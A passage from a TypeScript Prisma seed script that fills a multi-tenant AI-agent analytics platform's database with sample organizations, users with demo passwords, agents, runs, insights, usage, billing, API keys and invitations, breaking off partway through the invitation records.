import { PrismaClient, Role, PlanTier, AgentType, AgentStatus, AgentRunStatus, DataSourceType, DataSourceStatus, UsageMetric, SubscriptionStatus, InvitationStatus, BrandTrackingStatus, ReportType, ReportStatus } from '@prisma/client'
import bcrypt from 'bcryptjs'
import crypto from 'crypto'

const prisma = new PrismaClient()

// Helper to safely delete from tables that might not exist yet
async function safeDeleteMany(deleteOperation: () => Promise<unknown>): Promise<void> {
  try {
    await deleteOperation()
  } catch (error: unknown) {
    // Ignore P2021 error: "The table does not exist in the current database"
    // Use explicit type casting to handle Prisma error structure
    const prismaError = error as { code?: string }
    if (prismaError?.code === 'P2021') {
      // Table doesn't exist yet, skip silently
      return
    }
    throw error
  }
}

// Helper to safely run a seed section that might reference tables that don't exist
async function safeSeedSection(sectionName: string, seedOperation: () => Promise<void>): Promise<void> {
  try {
    await seedOperation()
  } catch (error: unknown) {
    // Ignore P2021 error: "The table does not exist in the current database"
    // Use explicit type casting to handle Prisma error structure
    const prismaError = error as { code?: string }
    if (prismaError?.code === 'P2021') {
      console.log(`⚠️  Skipping ${sectionName} - table not yet migrated`)
      return
    }
    throw error
  }
}

// Helper to hash passwords
async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 12)
}

// Helper to generate API key hash
function hashApiKey(key: string): string {
  return crypto.createHash('sha256').update(key).digest('hex')
}

async function main() {
  console.log('🌱 Starting database seed...')

  // Clean existing data (in reverse order of dependencies)
  console.log('🧹 Cleaning existing data...')

  // Clean new admin module data (reverse dependency order)
  // Using safeDeleteMany to handle tables that might not exist in the current database
  await safeDeleteMany(() => prisma.webhookDelivery.deleteMany())
  await safeDeleteMany(() => prisma.webhookEndpoint.deleteMany())
  await safeDeleteMany(() => prisma.incidentUpdate.deleteMany())
  await safeDeleteMany(() => prisma.platformIncident.deleteMany())
  await safeDeleteMany(() => prisma.integrationInstall.deleteMany())
  await safeDeleteMany(() => prisma.integrationApp.deleteMany())
  await safeDeleteMany(() => prisma.dataExport.deleteMany())
  await safeDeleteMany(() => prisma.legalHold.deleteMany())
  await safeDeleteMany(() => prisma.securityViolation.deleteMany())
  await safeDeleteMany(() => prisma.securityPolicy.deleteMany())
  await safeDeleteMany(() => prisma.complianceAttestation.deleteMany())
  await safeDeleteMany(() => prisma.complianceAudit.deleteMany())
  await safeDeleteMany(() => prisma.complianceFramework.deleteMany())
  await safeDeleteMany(() => prisma.threatEvent.deleteMany())
  await safeDeleteMany(() => prisma.iPBlocklist.deleteMany())
  await safeDeleteMany(() => prisma.dataRetentionPolicy.deleteMany())
  await safeDeleteMany(() => prisma.maintenanceWindow.deleteMany())
  await safeDeleteMany(() => prisma.releaseManagement.deleteMany())
  await safeDeleteMany(() => prisma.capacityMetric.deleteMany())
  await safeDeleteMany(() => prisma.domainVerification.deleteMany())
  await safeDeleteMany(() => prisma.enterpriseSSO.deleteMany())
  await safeDeleteMany(() => prisma.sCIMIntegration.deleteMany())
  await safeDeleteMany(() => prisma.trustedDevice.deleteMany())
  await safeDeleteMany(() => prisma.devicePolicy.deleteMany())
  await safeDeleteMany(() => prisma.aPIClient.deleteMany())
  await safeDeleteMany(() => prisma.analyticsSnapshot.deleteMany())
  await safeDeleteMany(() => prisma.customReport.deleteMany())
  await safeDeleteMany(() => prisma.broadcastMessage.deleteMany())

  // Clean super admin portal data
  await safeDeleteMany(() => prisma.platformAuditLog.deleteMany())
  await safeDeleteMany(() => prisma.superAdminSession.deleteMany())
  await safeDeleteMany(() => prisma.superAdmin.deleteMany())
  await safeDeleteMany(() => prisma.featureFlag.deleteMany())

  // Clean entitlement system data
  await safeDeleteMany(() => prisma.tenantEntitlement.deleteMany())
  await safeDeleteMany(() => prisma.planFeature.deleteMany())
  await safeDeleteMany(() => prisma.feature.deleteMany())
  await safeDeleteMany(() => prisma.plan.deleteMany())
  await safeDeleteMany(() => prisma.systemRule.deleteMany())
  await safeDeleteMany(() => prisma.ticketResponse.deleteMany())
  await safeDeleteMany(() => prisma.supportTicket.deleteMany())
  await safeDeleteMany(() => prisma.tenantHealthScore.deleteMany())
  await safeDeleteMany(() => prisma.systemNotification.deleteMany())
  await safeDeleteMany(() => prisma.systemConfig.deleteMany())
  await safeDeleteMany(() => prisma.organizationSuspension.deleteMany())
  await safeDeleteMany(() => prisma.userBan.deleteMany())

  await safeDeleteMany(() => prisma.brandTrackingSnapshot.deleteMany())
  await safeDeleteMany(() => prisma.brandTracking.deleteMany())
  await safeDeleteMany(() => prisma.insight.deleteMany())
  await safeDeleteMany(() => prisma.agentRun.deleteMany())
  await safeDeleteMany(() => prisma.agent.deleteMany())
  await safeDeleteMany(() => prisma.dataSource.deleteMany())
  await safeDeleteMany(() => prisma.auditLog.deleteMany())
  await safeDeleteMany(() => prisma.usageRecord.deleteMany())
  await safeDeleteMany(() => prisma.apiKey.deleteMany())
  await safeDeleteMany(() => prisma.invitation.deleteMany())
  await safeDeleteMany(() => prisma.billingSubscription.deleteMany())
  await safeDeleteMany(() => prisma.sSOConfiguration.deleteMany())
  await safeDeleteMany(() => prisma.report.deleteMany())
  await safeDeleteMany(() => prisma.chart.deleteMany())
  await safeDeleteMany(() => prisma.crosstab.deleteMany())
  await safeDeleteMany(() => prisma.dashboard.deleteMany())
  await safeDeleteMany(() => prisma.audience.deleteMany())
  await safeDeleteMany(() => prisma.organizationMember.deleteMany())
  await safeDeleteMany(() => prisma.session.deleteMany())
  await safeDeleteMany(() => prisma.account.deleteMany())
  await safeDeleteMany(() => prisma.user.deleteMany())
  await safeDeleteMany(() => prisma.organization.deleteMany())

  // ==================== ORGANIZATIONS ====================
  console.log('🏢 Creating organizations...')

  const acmeCorp = await prisma.organization.create({
    data: {
      name: 'Acme Corporation',
      slug: 'acme-corp',
      planTier: PlanTier.PROFESSIONAL,
      settings: {
        theme: 'light',
        timezone: 'America/New_York',
        features: { advancedAnalytics: true, customBranding: true }
      }
    }
  })

  const techStartup = await prisma.organization.create({
    data: {
      name: 'Tech Startup Inc',
      slug: 'tech-startup',
      planTier: PlanTier.STARTER,
      settings: {
        theme: 'dark',
        timezone: 'America/Los_Angeles',
        features: {}
      }
    }
  })

  const enterpriseCo = await prisma.organization.create({
    data: {
      name: 'Enterprise Solutions Ltd',
      slug: 'enterprise-solutions',
      planTier: PlanTier.ENTERPRISE,
      settings: {
        theme: 'system',
        timezone: 'Europe/London',
        features: { advancedAnalytics: true, customBranding: true, sso: true, auditLog: true }
      }
    }
  })

  // ==================== USERS ====================
  console.log('👥 Creating users...')

  const defaultPassword = await hashPassword('Password123!')

  // Admin user (owner of Acme Corp)
  const adminUser = await prisma.user.create({
    data: {
      email: 'admin@acme.com',
      name: 'Admin User',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=admin'
    }
  })

  // Regular users
  const johnDoe = await prisma.user.create({
    data: {
      email: 'john.doe@acme.com',
      name: 'John Doe',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=john'
    }
  })

  const janeSmith = await prisma.user.create({
    data: {
      email: 'jane.smith@acme.com',
      name: 'Jane Smith',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=jane'
    }
  })

  const bobWilson = await prisma.user.create({
    data: {
      email: 'bob@techstartup.io',
      name: 'Bob Wilson',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=bob'
    }
  })

  const sarahEnterprise = await prisma.user.create({
    data: {
      email: 'sarah@enterprise.co',
      name: 'Sarah Enterprise',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=sarah'
    }
  })

  const viewerUser = await prisma.user.create({
    data: {
      email: 'viewer@acme.com',
      name: 'Viewer Account',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=viewer'
    }
  })

  // Demo user for easy testing
  const demoUser = await prisma.user.create({
    data: {
      email: 'demo@example.com',
      name: 'Demo User',
      passwordHash: await hashPassword('demo123'),
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=demo'
    }
  })

  // Additional users for comprehensive testing
  const bannedUser = await prisma.user.create({
    data: {
      email: 'banned@example.com',
      name: 'Banned User',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=banned'
    }
  })

  const suspiciousUser = await prisma.user.create({
    data: {
      email: 'suspicious@example.com',
      name: 'Suspicious Account',
      passwordHash: defaultPassword,
      emailVerified: null, // Unverified
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=suspicious'
    }
  })

  const inactiveUser = await prisma.user.create({
    data: {
      email: 'inactive@oldcompany.com',
      name: 'Inactive User',
      passwordHash: defaultPassword,
      emailVerified: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000), // Verified 1 year ago
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=inactive'
    }
  })

  const trialUser = await prisma.user.create({
    data: {
      email: 'trial@startup.io',
      name: 'Trial User',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=trial'
    }
  })

  const enterpriseUser2 = await prisma.user.create({
    data: {
      email: 'mike@enterprise.co',
      name: 'Mike Enterprise',
      passwordHash: defaultPassword,
      emailVerified: new Date(),
      avatarUrl: 'https://api.dicebear.com/7.x/avataaars/svg?seed=mike'
    }
  })

  // ==================== ADDITIONAL ORGANIZATIONS ====================
  console.log('🏢 Creating additional organizations for testing...')

  const suspendedOrg = await prisma.organization.create({
    data: {
      name: 'Suspended Corp',
      slug: 'suspended-corp',
      planTier: PlanTier.PROFESSIONAL,
      settings: {
        theme: 'light',
        timezone: 'America/Chicago',
        features: {}
      }
    }
  })

  const billingIssueOrg = await prisma.organization.create({
    data: {
      name: 'Billing Issue Inc',
      slug: 'billing-issue-inc',
      planTier: PlanTier.STARTER,
      settings: {
        theme: 'dark',
        timezone: 'America/New_York',
        features: {}
      }
    }
  })

  const trialOrg = await prisma.organization.create({
    data: {
      name: 'Trial Company',
      slug: 'trial-company',
      planTier: PlanTier.STARTER,
      settings: {
        theme: 'system',
        timezone: 'Europe/Berlin',
        features: {}
      }
    }
  })

  // Additional organizations to reach 10+
  const globalMediaOrg = await prisma.organization.create({
    data: {
      name: 'Global Media Group',
      slug: 'global-media-group',
      planTier: PlanTier.ENTERPRISE,
      settings: {
        theme: 'light',
        timezone: 'Europe/London',
        features: { advancedAnalytics: true, customBranding: true, sso: true, auditLog: true, multiRegion: true }
      }
    }
  })

  const healthTechOrg = await prisma.organization.create({
    data: {
      name: 'HealthTech Innovations',
      slug: 'healthtech-innovations',
      planTier: PlanTier.PROFESSIONAL,
      settings: {
        theme: 'light',
        timezone: 'America/Los_Angeles',
        features: { advancedAnalytics: true, hipaaCompliant: true }
      }
    }
  })

  const retailGiantOrg = await prisma.organization.create({
    data: {
      name: 'Retail Giant Corp',
      slug: 'retail-giant-corp',
      planTier: PlanTier.ENTERPRISE,
      settings: {
        theme: 'dark',
        timezone: 'America/Chicago',
        features: { advancedAnalytics: true, customBranding: true, sso: true }
      }
    }
  })

  const financeProOrg = await prisma.organization.create({
    data: {
      name: 'Finance Pro Services',
      slug: 'finance-pro-services',
      planTier: PlanTier.PROFESSIONAL,
      settings: {
        theme: 'system',
        timezone: 'America/New_York',
        features: { advancedAnalytics: true, auditLog: true }
      }
    }
  })

  // ==================== ORGANIZATION MEMBERSHIPS ====================
  console.log('🔗 Creating organization memberships...')

  // Acme Corp memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: acmeCorp.id, userId: adminUser.id, role: Role.OWNER },
      { orgId: acmeCorp.id, userId: johnDoe.id, role: Role.ADMIN },
      { orgId: acmeCorp.id, userId: janeSmith.id, role: Role.MEMBER },
      { orgId: acmeCorp.id, userId: viewerUser.id, role: Role.VIEWER },
      { orgId: acmeCorp.id, userId: demoUser.id, role: Role.MEMBER },
    ]
  })

  // Tech Startup memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: techStartup.id, userId: bobWilson.id, role: Role.OWNER },
      { orgId: techStartup.id, userId: demoUser.id, role: Role.ADMIN },
    ]
  })

  // Enterprise Solutions memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: enterpriseCo.id, userId: sarahEnterprise.id, role: Role.OWNER },
      { orgId: enterpriseCo.id, userId: demoUser.id, role: Role.VIEWER },
      { orgId: enterpriseCo.id, userId: enterpriseUser2.id, role: Role.ADMIN },
    ]
  })

  // Suspended Corp memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: suspendedOrg.id, userId: bannedUser.id, role: Role.OWNER },
      { orgId: suspendedOrg.id, userId: suspiciousUser.id, role: Role.MEMBER },
    ]
  })

  // Billing Issue Inc memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: billingIssueOrg.id, userId: inactiveUser.id, role: Role.OWNER },
    ]
  })

  // Trial Company memberships
  await prisma.organizationMember.createMany({
    data: [
      { orgId: trialOrg.id, userId: trialUser.id, role: Role.OWNER },
    ]
  })

  // ==================== AGENTS ====================
  console.log('🤖 Creating agents...')

  const marketResearchAgent = await prisma.agent.create({
    data: {
      orgId: acmeCorp.id,
      name: 'Market Research Agent',
      description: 'Analyzes market trends and competitor data from GWI insights',
      type: AgentType.RESEARCH,
      status: AgentStatus.ACTIVE,
      createdBy: adminUser.id,
      configuration: {
        model: 'gpt-4',
        temperature: 0.7,
        maxTokens: 4000,
        dataSources: ['gwi-platform', 'competitor-feeds'],
        outputFormat: 'structured-report'
      }
    }
  })

  const audienceAnalysisAgent = await prisma.agent.create({
    data: {
      orgId: acmeCorp.id,
      name: 'Audience Analysis Agent',
      description: 'Deep-dives into audience segments and behavioral patterns',
      type: AgentType.ANALYSIS,
      status: AgentStatus.ACTIVE,
      createdBy: johnDoe.id,
      configuration: {
        model: 'gpt-4',
        temperature: 0.5,
        maxTokens: 8000,
        segments: ['millennials', 'gen-z', 'professionals'],
        metrics: ['engagement', 'sentiment', 'purchase-intent']
      }
    }
  })

  const weeklyReportAgent = await prisma.agent.create({
    data: {
      orgId: acmeCorp.id,
      name: 'Weekly Report Generator',
      description: 'Automatically generates weekly performance reports',
      type: AgentType.REPORTING,
      status: AgentStatus.ACTIVE,
      createdBy: janeSmith.id,
      configuration: {
        model: 'gpt-4',
        schedule: 'weekly',
        recipients: ['team@acme.com'],
        includeCharts: true,
        format: 'pdf'
      }
    }
  })

  const socialMonitorAgent = await prisma.agent.create({
    data: {
      orgId: acmeCorp.id,
      name: 'Social Media Monitor',
      description: 'Monitors brand mentions and sentiment across social platforms',
      type: AgentType.MONITORING,
      status: AgentStatus.PAUSED,
      createdBy: adminUser.id,
      configuration: {
        platforms: ['twitter', 'instagram', 'linkedin'],
        keywords: ['acme', 'acmecorp', '@acme'],
        alertThreshold: -0.3,
        checkInterval: '15m'
      }
    }
  })

  const customAgent = await prisma.agent.create({
    data: {
      orgId: acmeCorp.id,
      name: 'Custom Data Pipeline',
      description: 'Custom agent for specialized data processing workflows',
      type: AgentType.CUSTOM,
      status: AgentStatus.DRAFT,
      createdBy: johnDoe.id,
      configuration: {
        steps: ['fetch', 'transform', 'analyze', 'output'],
        customCode: true
      }
    }
  })

  // Tech Startup agents
  const startupResearchAgent = await prisma.agent.create({
    data: {
      orgId: techStartup.id,
      name: 'Competitor Intel Agent',
      description: 'Tracks competitor activities and market positioning',
      type: AgentType.RESEARCH,
      status: AgentStatus.ACTIVE,
      createdBy: bobWilson.id,
      configuration: {
        competitors: ['competitor-a', 'competitor-b'],
        trackingMetrics: ['pricing', 'features', 'reviews']
      }
    }
  })

  // Enterprise agents
  const enterpriseAnalysisAgent = await prisma.agent.create({
    data: {
      orgId: enterpriseCo.id,
      name: 'Enterprise Analytics Agent',
      description: 'Advanced analytics for enterprise-scale data processing',
      type: AgentType.ANALYSIS,
      status: AgentStatus.ACTIVE,
      createdBy: sarahEnterprise.id,
      configuration: {
        model: 'gpt-4-turbo',
        maxTokens: 16000,
        parallelProcessing: true,
        dataRetention: '90d'
      }
    }
  })

  // ==================== AGENT RUNS ====================
  console.log('🏃 Creating agent runs...')

  const now = new Date()
  const oneHourAgo = new Date(now.getTime() - 60 * 60 * 1000)
  const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000)
  const oneWeekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000)

  const completedRun1 = await prisma.agentRun.create({
    data: {
      agentId: marketResearchAgent.id,
      orgId: acmeCorp.id,
      status: AgentRunStatus.COMPLETED,
      tokensUsed: 3542,
      startedAt: oneHourAgo,
      completedAt: new Date(oneHourAgo.getTime() + 45000),
      input: { query: 'Analyze Q4 market trends in consumer electronics', region: 'North America' },
      output: {
        summary: 'Consumer electronics market showing 12% YoY growth',
        keyFindings: ['Mobile accessories up 23%', 'Smart home devices stabilizing', 'Wearables declining 5%'],
        confidence: 0.87
      }
    }
  })

  const completedRun2 = await prisma.agentRun.create({
    data: {
      agentId: audienceAnalysisAgent.id,
      orgId: acmeCorp.id,
      status: AgentRunStatus.COMPLETED,
      tokensUsed: 5821,
      startedAt: oneDayAgo,
      completedAt: new Date(oneDayAgo.getTime() + 120000),
      input: { segment: 'millennials', metrics: ['purchase_intent', 'brand_awareness'] },
      output: {
        segmentSize: 28500000,
        purchaseIntent: 0.42,
        brandAwareness: 0.67,
        topInterests: ['sustainability', 'tech', 'experiences']
      }
    }
  })

  const _runningRun = await prisma.agentRun.create({
    data: {
      agentId: weeklyReportAgent.id,
      orgId: acmeCorp.id,
      status: AgentRunStatus.RUNNING,
      tokensUsed: 1200,
      startedAt: new Date(now.getTime() - 5 * 60 * 1000),
      input: { reportType: 'weekly', dateRange: 'last_7_days' }
    }
  })

  const _failedRun = await prisma.agentRun.create({
    data: {
      agentId: socialMonitorAgent.id,
      orgId: acmeCorp.id,
      status: AgentRunStatus.FAILED,
      tokensUsed: 156,
      startedAt: oneWeekAgo,
      completedAt: new Date(oneWeekAgo.getTime() + 5000),
      input: { platforms: ['twitter'], keywords: ['acme'] },
      errorMessage: 'API rate limit exceeded. Please try again later.'
    }
  })

  const _pendingRun = await prisma.agentRun.create({
    data: {
      agentId: customAgent.id,
      orgId: acmeCorp.id,
      status: AgentRunStatus.PENDING,
      tokensUsed: 0,
      input: { pipeline: 'custom-etl', source: 'external-api' }
    }
  })

  // More completed runs for history
  for (let i = 0; i < 10; i++) {
    const daysAgo = new Date(now.getTime() - (i + 2) * 24 * 60 * 60 * 1000)
    await prisma.agentRun.create({
      data: {
        agentId: marketResearchAgent.id,
        orgId: acmeCorp.id,
        status: AgentRunStatus.COMPLETED,
        tokensUsed: Math.floor(Math.random() * 5000) + 1000,
        startedAt: daysAgo,
        completedAt: new Date(daysAgo.getTime() + Math.random() * 120000),
        input: { query: `Historical research query ${i + 1}`, automated: true },
        output: { summary: `Analysis results for query ${i + 1}`, dataPoints: Math.floor(Math.random() * 100) }
      }
    })
  }

  // ==================== DATA SOURCES ====================
  console.log('📊 Creating data sources...')

  await prisma.dataSource.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        name: 'GWI Platform API',
        type: DataSourceType.API,
        status: DataSourceStatus.CONNECTED,
        lastSync: new Date(now.getTime() - 30 * 60 * 1000),
        connectionConfig: {
          endpoint: 'https://api.globalwebindex.com/v2',
          authType: 'api_key',
          syncInterval: '1h'
        }
      },
      {
        orgId: acmeCorp.id,
        name: 'Internal Analytics DB',
        type: DataSourceType.DATABASE,
        status: DataSourceStatus.CONNECTED,
        lastSync: new Date(now.getTime() - 15 * 60 * 1000),
        connectionConfig: {
          type: 'postgresql',
          host: 'analytics.internal',
          database: 'metrics',
          ssl: true
        }
      },
      {
        orgId: acmeCorp.id,
        name: 'CSV Data Uploads',
        type: DataSourceType.FILE_UPLOAD,
        status: DataSourceStatus.CONNECTED,
        lastSync: oneDayAgo,
        connectionConfig: {
          supportedFormats: ['csv', 'xlsx', 'json'],
          maxFileSize: '50MB'
        }
      },
      {
        orgId: acmeCorp.id,
        name: 'Slack Notifications',
        type: DataSourceType.WEBHOOK,
        status: DataSourceStatus.CONNECTED,
        connectionConfig: {
          webhookUrl: 'https://hooks.slack.com/services/YOUR_WEBHOOK_URL',
          events: ['agent_completed', 'insight_generated']
        }
      },
      {
        orgId: acmeCorp.id,
        name: 'Salesforce Integration',
        type: DataSourceType.INTEGRATION,
        status: DataSourceStatus.ERROR,
        connectionConfig: {
          platform: 'salesforce',
          instanceUrl: 'https://acme.salesforce.com',
          error: 'OAuth token expired'
        }
      },
      {
        orgId: techStartup.id,
        name: 'GWI Spark API',
        type: DataSourceType.API,
        status: DataSourceStatus.CONNECTED,
        lastSync: oneHourAgo,
        connectionConfig: {
          endpoint: 'https://spark.globalwebindex.com/api',
          authType: 'bearer'
        }
      },
      {
        orgId: enterpriseCo.id,
        name: 'Enterprise Data Warehouse',
        type: DataSourceType.DATABASE,
        status: DataSourceStatus.CONNECTED,
        lastSync: new Date(now.getTime() - 5 * 60 * 1000),
        connectionConfig: {
          type: 'snowflake',
          account: 'enterprise-co',
          warehouse: 'analytics_wh'
        }
      }
    ]
  })

  // ==================== INSIGHTS ====================
  console.log('💡 Creating insights...')

  await prisma.insight.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        agentRunId: completedRun1.id,
        type: 'market_trend',
        title: 'Consumer Electronics Growth Accelerating',
        confidenceScore: 0.92,
        data: {
          trend: 'upward',
          growthRate: 12.3,
          period: 'Q4 2024',
          keyDrivers: ['holiday season', 'new product launches', 'price drops']
        }
      },
      {
        orgId: acmeCorp.id,
        agentRunId: completedRun1.id,
        type: 'competitor_analysis',
        title: 'Competitor X Gaining Market Share',
        confidenceScore: 0.78,
        data: {
          competitor: 'Competitor X',
          marketShareChange: 2.5,
          strategy: 'aggressive pricing',
          threat_level: 'medium'
        }
      },
      {
        orgId: acmeCorp.id,
        agentRunId: completedRun2.id,
        type: 'audience_segment',
        title: 'Millennial Purchase Intent Rising',
        confidenceScore: 0.85,
        data: {
          segment: 'millennials',
          metric: 'purchase_intent',
          change: 8.5,
          topCategories: ['sustainable products', 'tech gadgets', 'experiences']
        }
      },
      {
        orgId: acmeCorp.id,
        type: 'anomaly_detection',
        title: 'Unusual Traffic Pattern Detected',
        confidenceScore: 0.67,
        data: {
          metric: 'website_traffic',
          deviation: 145,
          possibleCauses: ['viral content', 'competitor outage', 'marketing campaign']
        }
      },
      {
        orgId: acmeCorp.id,
        type: 'recommendation',
        title: 'Optimize Ad Spend for Gen-Z',
        confidenceScore: 0.89,
        data: {
          recommendation: 'Shift 15% of ad budget to TikTok and Instagram Reels',
          expectedImpact: '+23% engagement',
          confidence: 'high',
          implementation: 'immediate'
        }
      },
      {
        orgId: techStartup.id,
        type: 'market_opportunity',
        title: 'Untapped Market Segment Identified',
        confidenceScore: 0.74,
        data: {
          segment: 'remote workers 35-44',
          opportunity: 'productivity tools',
          marketSize: '$2.3B',
          competition: 'low'
        }
      },
      {
        orgId: enterpriseCo.id,
        type: 'performance_alert',
        title: 'Campaign ROI Exceeding Targets',
        confidenceScore: 0.95,
        data: {
          campaign: 'Q4 Brand Awareness',
          actualROI: 3.2,
          targetROI: 2.5,
          status: 'exceeding'
        }
      }
    ]
  })

  // ==================== AUDIT LOGS ====================
  console.log('📝 Creating audit logs...')

  const auditActions = [
    { action: 'user.login', resourceType: 'session', userId: adminUser.id },
    { action: 'agent.create', resourceType: 'agent', resourceId: marketResearchAgent.id, userId: adminUser.id },
    { action: 'agent.run.start', resourceType: 'agent_run', resourceId: completedRun1.id, userId: johnDoe.id },
    { action: 'agent.run.complete', resourceType: 'agent_run', resourceId: completedRun1.id, userId: null },
    { action: 'data_source.connect', resourceType: 'data_source', userId: janeSmith.id },
    { action: 'settings.update', resourceType: 'organization', resourceId: acmeCorp.id, userId: adminUser.id },
    { action: 'member.invite', resourceType: 'invitation', userId: adminUser.id },
    { action: 'api_key.create', resourceType: 'api_key', userId: johnDoe.id },
    { action: 'insight.export', resourceType: 'insight', userId: janeSmith.id },
    { action: 'report.generate', resourceType: 'report', userId: johnDoe.id },
  ]

  for (let i = 0; i < auditActions.length; i++) {
    const auditAction = auditActions[i]
    await prisma.auditLog.create({
      data: {
        orgId: acmeCorp.id,
        userId: auditAction.userId,
        action: auditAction.action,
        resourceType: auditAction.resourceType,
        resourceId: auditAction.resourceId,
        ipAddress: '192.168.1.' + (100 + i),
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        timestamp: new Date(now.getTime() - i * 60 * 60 * 1000),
        metadata: { source: 'web', version: '1.0.0' }
      }
    })
  }

  // ==================== USAGE RECORDS ====================
  console.log('📈 Creating usage records...')

  // Generate usage records for the past 30 days
  for (let day = 0; day < 30; day++) {
    const recordDate = new Date(now.getTime() - day * 24 * 60 * 60 * 1000)

    await prisma.usageRecord.createMany({
      data: [
        {
          orgId: acmeCorp.id,
          metricType: UsageMetric.AGENT_RUNS,
          quantity: Math.floor(Math.random() * 50) + 10,
          recordedAt: recordDate
        },
        {
          orgId: acmeCorp.id,
          metricType: UsageMetric.TOKENS_CONSUMED,
          quantity: Math.floor(Math.random() * 100000) + 20000,
          recordedAt: recordDate
        },
        {
          orgId: acmeCorp.id,
          metricType: UsageMetric.API_CALLS,
          quantity: Math.floor(Math.random() * 500) + 100,
          recordedAt: recordDate
        },
        {
          orgId: techStartup.id,
          metricType: UsageMetric.AGENT_RUNS,
          quantity: Math.floor(Math.random() * 20) + 5,
          recordedAt: recordDate
        },
        {
          orgId: techStartup.id,
          metricType: UsageMetric.TOKENS_CONSUMED,
          quantity: Math.floor(Math.random() * 30000) + 5000,
          recordedAt: recordDate
        }
      ]
    })
  }

  // Current resource usage
  await prisma.usageRecord.createMany({
    data: [
      { orgId: acmeCorp.id, metricType: UsageMetric.DATA_SOURCES, quantity: 5 },
      { orgId: acmeCorp.id, metricType: UsageMetric.TEAM_SEATS, quantity: 5 },
      { orgId: acmeCorp.id, metricType: UsageMetric.STORAGE_GB, quantity: 12 },
      { orgId: techStartup.id, metricType: UsageMetric.DATA_SOURCES, quantity: 1 },
      { orgId: techStartup.id, metricType: UsageMetric.TEAM_SEATS, quantity: 2 },
      { orgId: techStartup.id, metricType: UsageMetric.STORAGE_GB, quantity: 3 },
      { orgId: enterpriseCo.id, metricType: UsageMetric.DATA_SOURCES, quantity: 8 },
      { orgId: enterpriseCo.id, metricType: UsageMetric.TEAM_SEATS, quantity: 25 },
      { orgId: enterpriseCo.id, metricType: UsageMetric.STORAGE_GB, quantity: 150 },
    ]
  })

  // ==================== BILLING SUBSCRIPTIONS ====================
  console.log('💳 Creating billing subscriptions...')

  await prisma.billingSubscription.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        stripeCustomerId: 'cus_acme_test_123',
        stripeSubscriptionId: 'sub_acme_test_456',
        planId: 'professional_monthly',
        status: SubscriptionStatus.ACTIVE,
        currentPeriodEnd: new Date(now.getTime() + 15 * 24 * 60 * 60 * 1000),
        cancelAtPeriodEnd: false
      },
      {
        orgId: techStartup.id,
        stripeCustomerId: 'cus_startup_test_789',
        stripeSubscriptionId: 'sub_startup_test_012',
        planId: 'starter_monthly',
        status: SubscriptionStatus.TRIALING,
        currentPeriodEnd: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
        cancelAtPeriodEnd: false
      },
      {
        orgId: enterpriseCo.id,
        stripeCustomerId: 'cus_enterprise_test_345',
        stripeSubscriptionId: 'sub_enterprise_test_678',
        planId: 'enterprise_yearly',
        status: SubscriptionStatus.ACTIVE,
        currentPeriodEnd: new Date(now.getTime() + 300 * 24 * 60 * 60 * 1000),
        cancelAtPeriodEnd: false
      }
    ]
  })

  // ==================== API KEYS ====================
  console.log('🔑 Creating API keys...')

  const apiKey1 = 'gwi_live_acme_' + crypto.randomBytes(24).toString('hex')
  const apiKey2 = 'gwi_test_acme_' + crypto.randomBytes(24).toString('hex')
  const apiKey3 = 'gwi_live_startup_' + crypto.randomBytes(24).toString('hex')

  await prisma.apiKey.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        userId: adminUser.id,
        name: 'Production API Key',
        keyPrefix: apiKey1.substring(0, 12),
        keyHash: hashApiKey(apiKey1),
        permissions: ['agents:read', 'agents:write', 'insights:read', 'data:read'],
        rateLimit: 1000,
        lastUsed: oneHourAgo
      },
      {
        orgId: acmeCorp.id,
        userId: johnDoe.id,
        name: 'Development API Key',
        keyPrefix: apiKey2.substring(0, 12),
        keyHash: hashApiKey(apiKey2),
        permissions: ['agents:read', 'insights:read'],
        rateLimit: 100,
        lastUsed: oneDayAgo
      },
      {
        orgId: techStartup.id,
        userId: bobWilson.id,
        name: 'Main API Key',
        keyPrefix: apiKey3.substring(0, 12),
        keyHash: hashApiKey(apiKey3),
        permissions: ['agents:read', 'agents:write', 'insights:read'],
        rateLimit: 500
      }
    ]
  })

  // ==================== INVITATIONS ====================
  console.log('✉️ Creating invitations...')

  await prisma.invitation.createMany({
    data: [
      {
        orgId: acmeCorp.id,
        email: 'newuser@acme.com',
        role: Role.MEMBER,
        token: crypto.randomBytes(32).toString('hex'),
        status: InvitationStatus.PENDING,
        expiresAt: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000)
      },
      {
        orgId: acmeCorp.id,
        email: 'contractor@external.com',
        role: Role.VIEWER,
        token: crypto.randomBytes(32).toString('hex'),
